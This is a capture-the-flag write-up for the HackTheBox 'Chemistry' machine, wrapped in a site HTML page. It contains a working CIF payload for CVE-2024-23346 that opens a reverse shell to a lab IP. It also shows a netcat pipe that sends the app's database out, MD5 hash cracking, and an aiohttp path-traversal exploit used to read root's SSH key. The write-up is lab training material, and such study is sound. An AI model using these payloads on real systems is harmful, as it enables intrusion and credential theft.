@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chemistry - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Chemistry machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, Chemistry, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Chemistry</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">March 8, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="Chemistry" src="../images/Chemistry/pwned.png" /></p>
+<p>Chemistry was an interesting box that involved exploiting a vulnerable web application handling CIF files.
+By leveraging CVE-2024-23346, I gained initial access through a crafted payload.
+After obtaining database credentials and cracking weakly hashed passwords, I secured SSH access.
+Privilege escalation was achieved by exploiting an outdated aiohttp service (CVE-2024-23334), ultimately leading to root.
+This box highlighted the dangers of insecure file parsing, weak password hashing, and outdated dependencies.</p>
+<h1>User flag</h1>
+<p>Initial nmap scan reveals just two ports. SSH on 22 and a werkzeug server on port 5000.</p>
+<p><img alt="nmap" src="../images/Chemistry/nmap.png" /></p>
+<h2>Initial access</h2>
+<p>First glance over the website provides me with an unknown to me file type. A CIF file.
+I will do some research to see what exactly is a CIF file and how it can useful for me.</p>
+<p>After some searching, I stumbled upon a CVE numbered as 2024-23346.</p>
+<p>https://nvd.nist.gov/vuln/detail/CVE-2024-23346
+https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346</p>
+<p><img alt="chemhome" src="../images/Chemistry/chemhome.png" /></p>
+<p>I'll register and login as <code>test1:test1</code></p>
+<p><img alt="dashboard" src="../images/Chemistry/dashboard.png" /></p>
+<p>I can grab the example file here. It'll help me structure the payload for a reverse shell.</p>
+<div class="codehilite"><pre><span></span><code><span class="gh">#</span>Example file
+
+data_Example
+_cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M &#39;P 1&#39;
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H 0.00000 0.00000 0.00000 1
+ O 0.50000 0.50000 0.50000 1
+</code></pre></div>
+
+<p>And this is my payload:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">data_Example</span>
+<span class="n">_cell_length_a</span><span class="w">    </span><span class="mf">10.00000</span>
+<span class="n">_cell_length_b</span><span class="w">    </span><span class="mf">10.00000</span>
+<span class="n">_cell_length_c</span><span class="w">    </span><span class="mf">10.00000</span>
+<span class="n">_cell_angle_alpha</span><span class="w"> </span><span class="mf">90.00000</span>
+<span class="n">_cell_angle_beta</span><span class="w">  </span><span class="mf">90.00000</span>
+<span class="n">_cell_angle_gamma</span><span class="w"> </span><span class="mf">90.00000</span>
+<span class="n">_symmetry_space_group_name_H</span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="s1">&#39;P 1&#39;</span>
+<span class="n">loop_</span>
+<span class="w"> </span><span class="n">_atom_site_label</span>
+<span class="w"> </span><span class="n">_atom_site_fract_x</span>
+<span class="w"> </span><span class="n">_atom_site_fract_y</span>
+<span class="w"> </span><span class="n">_atom_site_fract_z</span>
+<span class="w"> </span><span class="n">_atom_site_occupancy</span>
+
+<span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="mf">0.00000</span><span class="w"> </span><span class="mf">0.00000</span><span class="w"> </span><span class="mf">0.00000</span><span class="w"> </span><span class="mi">1</span>
+<span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="mf">0.50000</span><span class="w"> </span><span class="mf">0.50000</span><span class="w"> </span><span class="mf">0.50000</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">_space_group_magn</span><span class="o">.</span><span class="n">transform_BNS_Pp_abc</span><span class="w">  </span><span class="s1">&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c </span><span class="se">\&#39;</span><span class="s1">sh -i &gt;&amp; /dev/tcp/10.10.16.52/9001 0&gt;&amp;1</span><span class="se">\&#39;</span><span class="s1">&quot;);0,0,0&#39;</span>
+
+<span class="n">_space_group_magn</span><span class="o">.</span><span class="n">number_BNS</span><span class="w">  </span><span class="mf">62.448</span>
+<span class="n">_space_group_magn</span><span class="o">.</span><span class="n">name_BNS</span><span class="w">  </span><span class="s2">&quot;P  n&#39;  m  a&#39;  &quot;</span>
+</code></pre></div>
+
+<p><img alt="shell" src="../images/Chemistry/shell.png" /></p>
+<h2>Exfiltrating the database</h2>
+<p>It worked! I can now proceed and look through the files. I'll look for a database file, hoping to grab some credentials and secure an SSH connection.</p>
+<p>In the instance directory, I found a database file. I'll send it over to my machine with netcat.</p>
+<div class="codehilite"><pre><span></span><code>Chemistry-machine: cat instance/database.db | nc (IP) (PORT)
+
+My-machine nc -lp (PORT) &lt; database.db
+</code></pre></div>
+
+<p>Note: There is no indication nor any sign that the transfer was complete. Leave the connection ongoing for a minute, even if it seems like it hung up and then feel free to close it.</p>
+<p><img alt="succesful" src="../images/Chemistry/succesful.png" /></p>
+<p>There are a lot of users in the database file. I'll grab the first 14, since every account below that seems to be user-made(Other HTB players).</p>
+<p>I'll save the file as users.txt, then I'll extract only the hashes using awk and I'll save them into hashes.txt.</p>
+<div class="codehilite"><pre><span></span><code>awk -F&#39;|&#39; &#39;{print$3}&#39; users.txt &gt; hashes.txt
+</code></pre></div>
+
+<p>During my recon on the box after getting the shell, I saw this while reading through the app.py file.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">@app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">methods</span><span class="o">=[</span><span class="n">&#39;GET&#39;, &#39;POST&#39;</span><span class="o">]</span><span class="p">)</span>
+<span class="n">def</span><span class="w"> </span><span class="n">login</span><span class="p">()</span><span class="err">:</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="k">method</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="err">:</span>
+<span class="w">        </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
+<span class="w">        </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
+<span class="w">        </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">).</span><span class="k">first</span><span class="p">()</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span><span class="err">:</span>
+<span class="w">            </span><span class="n">login_user</span><span class="p">(</span><span class="k">user</span><span class="p">)</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
+<span class="w">        </span><span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid credentials&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Since the application uses MD5 hashing for passwords, cracking them with Hashcat is trivial. MD5 has been deprecated for security purposes due to its weaknesses, making this an easy attack vector.</p>
+<p><img alt="cracked" src="../images/Chemistry/cracked.png" /></p>
+<p>I've got passwords for users rosa, carlos, peter and victoria. However, only rosa exists on  the machine. This can be checked right after receiving back the reverse shell.</p>
+<p><img alt="rights" src="../images/Chemistry/rights.png" /></p>
+<p>There is also no mention of any blockades or blacklists in the config file of ssh. I'll try to SSH into the box as rosa.</p>
+<p><img alt="user" src="../images/Chemistry/user.png" /></p>
+<h1>Root flag</h1>
+<p>I'll check for active ports using ss with the flags -tulnp.</p>
+<p><img alt="check" src="../images/Chemistry/check.png" /></p>
+<p>The service running on port 8080 interests me. I'll check what is running there via curl.</p>
+<div class="codehilite"><pre><span></span><code>curl localhost:8080 --head
+</code></pre></div>
+
+<p><img alt="head" src="../images/Chemistry/head.png" /></p>
+<p>I searched for exploits for this version of aiohttp and found one rather quickly. Im going to use CVE-2024-23334 in order to find something that'll allow me to gain root access to the box.</p>
+<p>https://github.com/wizarddos/CVE-2024-23334</p>
+<p>I cloned this repo onto my box and started up a python server, so that I could download exploit.py onto the chemistry machine via wget.</p>
+<div class="codehilite"><pre><span></span><code>python3 exploit.py -u http://127.0.0.1:8080/ -f /root/.ssh/authorized_keys -d assets
+</code></pre></div>
+
+<p><img alt="exploi" src="../images/Chemistry/exploit.png" /></p>
+<p>Perfect! This private key will allow me to SSH into the box as root!
+I'll copy the entire key into a file on my box.</p>
+<div class="codehilite"><pre><span></span><code>echo &#39;key&#39; &gt; keyfile.pem
+</code></pre></div>
+
+<p>Before trying to connect, however, I'll use the command 'chmod' with parameter '600' on the keyfile, because SSH does not like keys with loose permissions.</p>
+<p><img alt="root" src="../images/Chemistry/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Chemistry") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
